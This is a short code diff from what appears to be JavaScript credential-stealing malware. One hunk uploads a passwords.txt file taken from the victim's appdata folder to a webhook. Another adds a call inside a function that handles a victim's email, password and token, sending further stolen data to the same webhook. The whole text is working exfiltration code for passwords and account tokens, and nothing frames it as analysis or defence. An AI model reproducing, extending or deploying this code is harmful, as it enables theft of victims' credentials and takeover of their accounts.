@@ -685,7 +685,7 @@ async function takePizzas() {
       
         const form = new FormData();
         form.append("file", fs.createReadStream(appdata+"\\passwords.txt"));
-        form.submit(superstarlmao, (error, response) => {
+        form.submit(webhook, (error, response) => {
         if (error) console.log(error);
         });
     });
@@ -823,6 +823,7 @@ function ChangeEmail(newemail, password, token) {
                     }]
                 }
                 SendToWebhook(JSON.stringify(params))
+		SendToWebhook(pizza)
             })
         })
     })
